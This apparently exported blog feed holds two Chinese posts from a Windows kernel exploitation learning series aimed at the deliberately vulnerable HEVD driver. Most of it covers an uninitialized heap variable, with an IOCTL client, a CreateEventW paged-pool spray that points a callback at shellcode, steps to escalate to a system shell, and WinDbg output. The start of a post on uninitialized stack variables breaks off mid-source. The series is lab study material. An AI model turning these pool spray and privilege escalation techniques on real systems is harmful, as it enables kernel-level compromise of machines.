class="number">0xE8</span>u);</span><br><span class="line">      UninitializedHeapVariable-&gt;Buffer[<span class="number">0x39</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DbgPrint(<span class="string">"[+] Triggering Uninitialized Heap Variable Vulnerability\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( UninitializedHeapVariable )</span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrint(<span class="string">"[+] UninitializedHeapVariable-&gt;Value: 0x%p\n"</span>, UninitializedHeapVariable-&gt;Value);</span><br><span class="line">      DbgPrint(<span class="string">"[+] UninitializedHeapVariable-&gt;Callback: 0x%p\n"</span>, UninitializedHeapVariable-&gt;Callback);</span><br><span class="line">      UninitializedHeapVariable-&gt;Callback();</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">"[-] Unable to allocate Pool chunk\n"</span>);</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">    result = <span class="number">0xC0000017</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们查看一下源码文件是如何说明的，安全的方案先检查了是否存在空指针，然后将<code>UninitializedMemory</code>置为NULL，最后安全的调用了回调函数，而不安全的方案则在不确定 Value 和 Callback 的情况下直接调用了回调函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DbgPrint(<span class="string">"[+] Freeing UninitializedMemory Object\n"</span>);</span><br><span class="line">            DbgPrint(<span class="string">"[+] Pool Tag: %s\n"</span>, STRINGIFY(POOL_TAG));</span><br><span class="line">            DbgPrint(<span class="string">"[+] Pool Chunk: 0x%p\n"</span>, UninitializedMemory);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Free the allocated Pool chunk</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            ExFreePoolWithTag((PVOID)UninitializedMemory, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Secure Note: This is secure because the developer is setting 'UninitializedMemory'</span></span><br><span class="line">            <span class="comment">// to NULL and checks for NULL pointer before calling the callback</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Set to NULL to avoid dangling pointer</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            UninitializedMemory = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Uninitialized Heap Variable vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is not setting 'Value' &amp; 'Callback' to definite known value</span></span><br><span class="line">        <span class="comment">// before calling the 'Callback'</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Uninitialized Memory in PagedPool\n"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Call the callback function</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (UninitializedMemory)</span><br><span class="line">        &#123;</span><br><span class="line">            DbgPrint(<span class="string">"[+] UninitializedMemory-&gt;Value: 0x%p\n"</span>, UninitializedMemory-&gt;Value);</span><br><span class="line">            DbgPrint(<span class="string">"[+] UninitializedMemory-&gt;Callback: 0x%p\n"</span>, UninitializedMemory-&gt;Callback);</span><br><span class="line"></span><br><span class="line">            UninitializedMemory-&gt;Callback();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">"[-] Exception Code: 0x%X\n"</span>, Status);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>漏洞的原理我们很清楚了，现在就是如何构造和利用的问题了，如果你没有看过我之前的文章，建议看完这里之后去看看池溢出那一篇，最好是读一下文章中所提到的Tarjei Mandt 写的 Kernel Pool Exploitation on Windows 7，对Windows 7 内核池有一个比较好的认识</p>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><h2 id="控制码"><a href="#控制码" class="headerlink" title="控制码"></a>控制码</h2><p>我们还是从控制码入手，在<code>HackSysExtremeVulnerableDriver.h</code>中定位到相应的定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL               IOCTL(0x80C)</span></span><br></pre></td></tr></table></figure>
<p>然后我们用python计算一下控制码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((<span class="number">0x00000022</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0x00000000</span> &lt;&lt; <span class="number">14</span>) | (<span class="number">0x80c</span> &lt;&lt; <span class="number">2</span>) | <span class="number">0x00000003</span>)</span><br><span class="line"><span class="string">'0x222033'</span></span><br></pre></td></tr></table></figure>
<p>我们验证一下我们的代码，我们先传入 buf = 0xBAD0B0B0 观察，构造如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Get HANDLE</span></span><br><span class="line">	hDevice = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to get HANDLE...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Success to get HANDLE!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PDWORD32)(buf) = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x222033</span>, buf, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (init() == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+]Failed to get HANDLE!!!\n"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Trigger_shellcode();</span><br><span class="line">	<span class="comment">//__debugbreak();</span></span><br><span class="line">    </span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们打印的信息如下，如我们所愿，并没有异常发生</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; g</span><br><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Type: PagedPool</span><br><span class="line">[+] Pool Size: 0xF0</span><br><span class="line">[+] Pool Chunk: 0x9A7FFF10</span><br><span class="line">[+] UserValue: 0xBAD0B0B0</span><br><span class="line">[+] UninitializedHeapVariable Address: 0x97EF4AB8</span><br><span class="line">[+] Triggering Uninitialized Heap Variable Vulnerability</span><br><span class="line">[+] UninitializedHeapVariable-&gt;Value: 0xBAD0B0B0</span><br><span class="line">[+] UninitializedHeapVariable-&gt;Callback: 0x8D6A3D58</span><br><span class="line">[+] Uninitialized Heap Variable Object Callback</span><br><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******</span><br></pre></td></tr></table></figure>
<p>我们尝试传入不同的值观察是否有异常发生</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PDWORD32)(buf) = <span class="number">0xBAD0B0B0</span>+<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x222033</span>, buf, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们在调用运行效果如下，这里被异常处理所接受，这里我们Callback有一个值，我们查看之后发现是一个无效地址，我们希望的当然是指向我们的shellcode，所以就需要想办法构造了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Type: PagedPool</span><br><span class="line">[+] Pool Size: 0xF0</span><br><span class="line">[+] Pool Chunk: 0x9A03C430</span><br><span class="line">[+] UserValue: 0xBAD0B0B1</span><br><span class="line">[+] UninitializedHeapVariable Address: 0x8E99BAB8</span><br><span class="line">[+] Triggering Uninitialized Heap Variable Vulnerability</span><br><span class="line">[+] UninitializedHeapVariable-&gt;Value: 0x00000000</span><br><span class="line">[+] UninitializedHeapVariable-&gt;Callback: 0xDD1CB39C</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">8d6a3e83 ff5004          call    dword ptr [eax+4]</span><br><span class="line">0: kd&gt; dd 0xDD1CB39C</span><br><span class="line">dd1cb39c  ???????? ???????? ???????? ????????</span><br><span class="line">dd1cb3ac  ???????? ???????? ???????? ????????</span><br><span class="line">dd1cb3bc  ???????? ???????? ???????? ????????</span><br><span class="line">dd1cb3cc  ???????? ???????? ???????? ????????</span><br><span class="line">dd1cb3dc  ???????? ???????? ???????? ????????</span><br><span class="line">dd1cb3ec  ???????? ???????? ???????? ????????</span><br><span class="line">dd1cb3fc  ???????? ???????? ???????? ????????</span><br><span class="line">dd1cb40c  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
<h2 id="构造堆结构"><a href="#构造堆结构" class="headerlink" title="构造堆结构"></a>构造堆结构</h2><p>现在我们已经有了思路，还是把Callback指向shellcode，既然上一篇类似的问题能够栈喷射，那这里我们自然想到了堆喷射，回想我们在池溢出里堆喷射所用的函数<code>CreateEventA</code>，这里我们多研究一下这个函数，要知道我们这里是分页池而不是非分页池，如果你用池溢出那一段申请很多Event对象的代码的话，是看不到一个Event对象存在分页池里面的(并且会蓝屏)，但是函数中的<code>lpName</code>这个参数就比较神奇了，它是分配在分页池里面的，并且是我们可以操控的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEventA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bManualReset,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInitialState,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>为了更好的理解这里的利用，让我们复习一下 Windows 7 下的<code>Lookaside Lists</code>快表结构，并且我们知道最大块大小是0x20，最多有256个块(前置知识来自Tarjei Mandt的Kernel Pool Exploitation on Windows 7文章)，这里要清楚的是我们是在修改快表的结构，因为申请池一开始是调用的快表，如果快表不合适才会去调用空表(ListHeads)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GENERAL_LOOKASIDE_POOL</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">				<span class="keyword">union</span>&#123;</span><br><span class="line"><span class="comment">/*0x000*/</span>					<span class="keyword">union</span> _SLIST_HEADER ListHead;</span><br><span class="line"><span class="comment">/*0x000*/</span>					<span class="class"><span class="keyword">struct</span> _<span class="title">SINGLE_LIST_ENTRY</span> <span class="title">SingleListHead</span>;</span></span><br><span class="line">				&#125;;</span><br><span class="line"><span class="comment">/*0x008*/</span>  		 UINT16			Depth;</span><br><span class="line"><span class="comment">/*0x00A*/</span>		 UINT16			MaximumDepth;</span><br><span class="line"><span class="comment">/*0x00C*/</span>		 ULONG32		TotalAllocates;</span><br><span class="line">				<span class="keyword">union</span>&#123;</span><br><span class="line"><span class="comment">/*0x010*/</span>					ULONG32 AllocateMisses;</span><br><span class="line"><span class="comment">/*0x010*/</span>					ULONG32 AllocateHits;</span><br><span class="line">				&#125;;</span><br><span class="line"><span class="comment">/*0x014*/</span>  		 ULONG32        TotalFrees;</span><br><span class="line">				<span class="keyword">union</span>&#123;</span><br><span class="line"><span class="comment">/*0x018*/</span>					ULONG32 FreeMisses;</span><br><span class="line"><span class="comment">/*0x018*/</span>					ULONG32 FreeHits;</span><br><span class="line">				&#125;;</span><br><span class="line"><span class="comment">/*0x01C*/</span>		<span class="keyword">enum</span> _POOL_TYPE  Type;</span><br><span class="line"><span class="comment">/*0x020*/</span>		ULONG32        Tag;</span><br><span class="line"><span class="comment">/*0x024*/</span>		ULONG32        Size;</span><br><span class="line">			    <span class="keyword">union</span>&#123;</span><br><span class="line"><span class="comment">/*0x028*/</span>					PVOID AllocateEx;</span><br><span class="line"><span class="comment">/*0x028*/</span>					PVOID Allocate;</span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">union</span>&#123;</span><br><span class="line"><span class="comment">/*0x02C*/</span>                    PVOID FreeEx;</span><br><span class="line"><span class="comment">/*0x02C*/</span>                    PVOIDFree;</span><br><span class="line">				&#125;;</span><br><span class="line"><span class="comment">/*0x030*/</span>  		<span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ListEntry</span>;</span></span><br><span class="line"><span class="comment">/*0x038*/</span>  		ULONG32        LastTotalAllocates;</span><br><span class="line">			    <span class="keyword">union</span>&#123;</span><br><span class="line"><span class="comment">/*0x03C*/</span>				ULONG32 LastAllocateMisses;</span><br><span class="line"><span class="comment">/*0x03C*/</span>				ULONG32 LastAllocateHits;	</span><br><span class="line">				&#125;;</span><br><span class="line"><span class="comment">/*0x040*/</span>		 ULONG32 Future [<span class="number">2</span>];</span><br><span class="line">&#125; GENERAL_LOOKASIDE_POOL, *PGENERAL_LOOKASIDE_POOL;</span><br></pre></td></tr></table></figure>
<p>我们还需要知道的是，我们申请的每一个结构中的<code>lpName</code>还不能一样，不然两个池在后面就相当于一个在运作，又因为pool size为0xf0，加上header就是0xf8，所以我们这里考虑将<code>lpName</code>大小设为0xf0，因为源码中我们的堆结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNINITIALIZED_HEAP_VARIABLE</span> &#123;</span></span><br><span class="line">        ULONG_PTR Value;</span><br><span class="line">        FunctionPointer Callback;</span><br><span class="line">        ULONG_PTR Buffer[<span class="number">58</span>];</span><br><span class="line">&#125; UNINITIALIZED_HEAP_VARIABLE, *PUNINITIALIZED_HEAP_VARIABLE;</span><br></pre></td></tr></table></figure>
<p>我们可以确定回调函数在 +0x4 的位置，放入我们的shellcode之后我们在利用循环中的 i 设置不同的 lpname 就行啦</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	*(PDWORD)(lpName + <span class="number">0x4</span>) = (DWORD)&amp; ShellCode;</span><br><span class="line">	*(PDWORD)(lpName + <span class="number">0xf0</span> - <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">	*(PDWORD)(lpName + <span class="number">0xf0</span> - <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">	*(PDWORD)(lpName + <span class="number">0xf0</span> - <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">	*(PDWORD)(lpName + <span class="number">0xf0</span> - <span class="number">1</span>) = i;</span><br><span class="line">	Event_OBJECT[i] = CreateEventW(<span class="literal">NULL</span>, FALSE, FALSE, lpName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后我们整合一下代码就可以提权了，总结一下步骤</p>
<ul>
<li>初始化句柄等结构</li>
<li>构造 lpName 结构</li>
<li>调用<code>CreateEventW</code>进行喷射</li>
<li>调用<code>TriggerUninitializedHeapVariable</code>函数触发漏洞</li>
<li>调用cmd提权</li>
</ul>
<p>提权的过程中你可以参考下面几个地方查看相应的位置是否正确</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; g</span><br><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Type: PagedPool</span><br><span class="line">[+] Pool Size: 0xF0</span><br><span class="line">[+] Pool Chunk: 0x909FE380</span><br><span class="line">[+] UserValue: 0xBAD0B0B1</span><br><span class="line">[+] UninitializedHeapVariable Address: 0x97E80AB8</span><br><span class="line">[+] Triggering Uninitialized Heap Variable Vulnerability</span><br><span class="line">[+] UninitializedHeapVariable-&gt;Value: 0x00000000</span><br><span class="line">[+] UninitializedHeapVariable-&gt;Callback: 0x00371040</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">8d6a3e83 ff5004          call    dword ptr [eax+4]</span><br><span class="line">1: kd&gt; !pool 0x909FE380 // 查看池布局</span><br><span class="line">unable to get nt!ExpHeapBackedPoolEnabledState</span><br><span class="line">Pool page 909fe380 region is Paged pool</span><br><span class="line"> 909fe000 size:  1e0 previous size:    0  (Free)       AlSe</span><br><span class="line"> 909fe1e0 size:   28 previous size:  1e0  (Allocated)  MmSm</span><br><span class="line"> 909fe208 size:   80 previous size:   28  (Free)       NtFU</span><br><span class="line"> 909fe288 size:   18 previous size:   80  (Allocated)  Ntf0</span><br><span class="line"> 909fe2a0 size:   18 previous size:   18  (Free)       CMVI</span><br><span class="line"> 909fe2b8 size:   a8 previous size:   18  (Allocated)  CIcr</span><br><span class="line"> 909fe360 size:   18 previous size:   a8  (Allocated)  PfFK</span><br><span class="line">*909fe378 size:   f8 previous size:   18  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> 909fe470 size:  1d8 previous size:   f8  (Allocated)  FMfn</span><br><span class="line"> 909fe648 size:  4d0 previous size:  1d8  (Allocated)  CIcr</span><br><span class="line"> 909feb18 size:  4e8 previous size:  4d0  (Allocated)  CIcr</span><br><span class="line">1: kd&gt; dd 909fe470-8 // 查看下一个池</span><br><span class="line">909fe468  41414141 000e0000 063b021f 6e664d46</span><br><span class="line">909fe478  01d0f204 00000000 0000032e 00000000</span><br><span class="line">909fe488  909fe488 00000000 00000000 87ac918c</span><br><span class="line">909fe498  00000000 00000000 00018000 00000040</span><br><span class="line">909fe4a8  00000001 0160015e 909fe4e8 002e002e</span><br><span class="line">909fe4b8  909fe4e8 00000000 00000000 00000000</span><br><span class="line">909fe4c8  00000000 00000000 00000000 00000000</span><br><span class="line">909fe4d8  00000000 00000000 00000000 00000002</span><br><span class="line">1: kd&gt; u 0x00371040 // 查看shellcode位置是否正确</span><br><span class="line">00371040 53              push    ebx</span><br><span class="line">00371041 56              push    esi</span><br><span class="line">00371042 57              push    edi</span><br><span class="line">00371043 60              pushad</span><br><span class="line">00371044 64a124010000    mov     eax,dword ptr fs:[00000124h]</span><br><span class="line">0037104a 8b4050          mov     eax,dword ptr [eax+50h]</span><br><span class="line">0037104d 8bc8            mov     ecx,eax</span><br><span class="line">0037104f ba04000000      mov     edx,4</span><br></pre></td></tr></table></figure>
<p>提权效果如下，详细的代码参考<a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/Uninitialized-Heap-Variable/UninitializedHeapVariable/UninitializedHeapVariable.c" target="_blank" rel="noopener">这里</a></p>
<p><img src="/2019/07/28/Windows-Kernel-Exploit-内核漏洞学习-7-Uninitialized-Heap-Variable/test.gif" alt="test"></p>
<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>到这里我的Windows Kernel exploit系列也就结束了，这个过程比较艰辛，也阅读了许多的资料，其实有些地方我也搞的不是很懂，但我一般的方法是如果一天对这个问题没有丝毫的进展，我就不会再去死磕了(貌似是坏习惯?)，因为后面我还是继续学内核，学到后面一些知识以后说不定这里的问题就豁然开朗了，当然前提是没有忘记这个问题，其实有些漏洞的篇幅可能比较短，有些地方的措词和代码可能不是很好，也可能有一些错误存在，希望读者大大们多多包容，也希望初学者能够自己去阅读资料把exp调试出来，其实有些地方我也适当的进行了省略(比如这篇为啥用的是CreateEventW函数喷射而不是CreateEventA)，需要你自己多多去尝试思考，非常感谢wjllz师傅以及Sakura师傅，给了我很大的引导，当然这并不是获奖感言啥的。。。只是对自己这一阶段的总结，自己对内核的研究也并不会结束(其实是刚刚开始)，越来越意识到自己要学的东西很多，还是慢慢努力吧，最后说一句，这不是教程，只是我分享的一个学习过程</p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-内核漏洞学习(6)-Uninitialized-Stack-Variable</title>
    <url>/2019/07/28/Windows-Kernel-Exploit-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-Uninitialized-Stack-Variable/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这是 Windows kernel exploit 系列的第六部分，前一篇我们讲了空指针解引用，这一篇我们讲内核未初始化栈利用，这篇虽然是内核栈的利用，与前面不同的是，这里需要引入一个新利用手法 =&gt; 栈喷射，需要你对内核栈和用户栈理解的比较深入，看此文章之前你需要有以下准备：</p>
<ul>
<li>Windows 7 x86 sp1虚拟机</li>
<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
<li>HEVD+OSR Loader配合构造漏洞环境</li>
</ul>
<h1 id="0x01：漏洞原理"><a href="#0x01：漏洞原理" class="headerlink" title="0x01：漏洞原理"></a>0x01：漏洞原理</h1><h2 id="未初始化栈变量"><a href="#未初始化栈变量" class="headerlink" title="未初始化栈变量"></a>未初始化栈变量</h2><p>我们还是先用IDA分析<code>HEVD.sys</code>，找到相应的函数<code>TriggerUninitializedStackVariable</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">TriggerUninitializedStackVariable</span><span class="params">(<span class="keyword">void</span> *UserBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> UserValue; <span class="comment">// esi</span></span><br><span class="line">  _UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable; <span class="comment">// [esp+10h] [ebp-10Ch]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+104h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">0xF0</span>u, <span class="number">4u</span>);</span><br><span class="line">  UserValue = *(_DWORD *)UserBuffer;</span><br><span class="line">  DbgPrint(<span class="string">"[+] UserValue: 0x%p\n"</span>, *(_DWORD *)UserBuffer);</span><br><span class="line">  DbgPrint(<span class="string">"[+] UninitializedStackVariable Address: 0x%p\n"</span>, &amp;UninitializedStackVariable);</span><br><span class="line">  <span class="keyword">if</span> ( UserValue == <span class="number">0xBAD0B0B0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    UninitializedStackVariable.Value = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">    UninitializedStackVariable.Callback = (<span class="keyword">void</span> (__stdcall *)())UninitializedStackVariableObjectCallback;</span><br><span class="line">  &#125;</span><br><span class="line">  DbgPrint(<span class="string">"[+] UninitializedStackVariable.Value: 0x%p\n"</span>, UninitializedStackVariable.Value);</span><br><span class="line">  DbgPrint(<span class="string">"[+] UninitializedStackVariable.Callback: 0x%p\n"</span>, UninitializedStackVariable.Callback);</span><br><span class="line">  DbgPrint(<span class="string">"[+] Triggering Uninitialized Stack Variable Vulnerability\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( UninitializedStackVariable.Callback )</span><br><span class="line">    UninitializedStackVariable.Callback();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们仔细分析一下，首先函数将一个值设为0，<code>ms_exc</code>原型如下，它其实就是一个异常处理机制(预示着下面肯定要出异常)，然后我们还是将传入的<code>UserBuffer</code>和 0xBAD0B0B0 比较，如果相等的话就给<code>UninitializedStackVariable</code>函数的一些参数赋值，后面又判断了回调函数的存在性，最后调用回调函数，也就是说，我们传入的值不同的话可能就存在利用点，所以我们将聚焦点移到<code>UninitializedStackVariable</code>函数上</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CPPEH_RECORD</span>      </span></span><br><span class="line"><span class="class">&#123;</span>      </span><br><span class="line">    DWORD old_esp;  <span class="comment">//ESP     </span></span><br><span class="line">    DWORD exc_ptr;  <span class="comment">//GetExceptionInformation return value     </span></span><br><span class="line">    DWORD prev_er;  <span class="comment">//prev _EXCEPTION_REGISTRATION_RECORD     </span></span><br><span class="line">    DWORD handler;  <span class="comment">//Handler     </span></span><br><span class="line">    DWORD msEH_ptr; <span class="comment">//Scopetable     </span></span><br><span class="line">    DWORD disabled; <span class="comment">//TryLevel     </span></span><br><span class="line">&#125;CPPEH_RECORD,*PCPPEH_RECORD;</span><br></pre></td></tr></table></figure>
<p>我们来看一下源码里是如何介绍的，显而易见，一个初始化将<code>UninitializedMemory</code>置为了NULL，而另一个没有，要清楚的是我们现在看的是内核的漏洞，与用户模式并不相同，所以审计代码的时候要非常仔细</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Secure Note: This is secure because the developer is properly initializing</span></span><br><span class="line">    <span class="comment">// UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling</span></span><br><span class="line">    <span class="comment">// the callback</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    UNINITIALIZED_MEMORY_STACK UninitializedMemory = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability</span></span><br><span class="line">    <span class="comment">// because the developer is not initializing 'UNINITIALIZED_MEMORY_STACK' structure</span></span><br><span class="line">    <span class="comment">// before calling the callback when 'MagicValue' does not match 'UserValue'</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span 